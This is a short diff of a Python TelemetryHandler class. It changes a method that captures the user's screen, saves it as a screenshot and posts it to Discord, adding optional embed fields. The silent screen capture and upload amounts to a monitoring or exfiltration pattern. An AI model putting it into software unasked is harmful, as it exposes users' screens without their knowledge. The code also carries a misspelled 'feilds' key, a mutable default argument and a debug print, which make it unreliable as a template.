@@ -44,16 +44,21 @@ class TelemetryHandler:
             
             return img
         
-    def send_telemetry(self) -> None:
+    def send_telemetry(self, data = {}) -> None:
         try:
             # Capture the screen and save it
             img = self.__capture_screen()
             img.save("screenshot.png")
             
-            # Send a telemetry message to discord
-            self.send_discord_embed({
+            telemetry = {
                 "image": "screenshot.png"
-            })
+            }
+
+            if data.get("feilds"):
+                print('DEBUG: Sending telemetry with feilds')
+                telemetry["feilds"] = data["feilds"]
+
+            self.send_discord_embed(telemetry)
             
             img.close()
             
@@ -69,6 +74,7 @@ class TelemetryHandler:
             embed_copy["description"] = data.get("description", DEFAULT_EMBED["description"])
             embed_copy["color"] = data.get("color", DEFAULT_EMBED["color"])
             embed_copy["footer"] = data.get("footer", DEFAULT_EMBED["footer"])
+            embed_copy["fields"] = data.get("feilds", [])
             
             if data.get("image"):
                 image = data["image"]
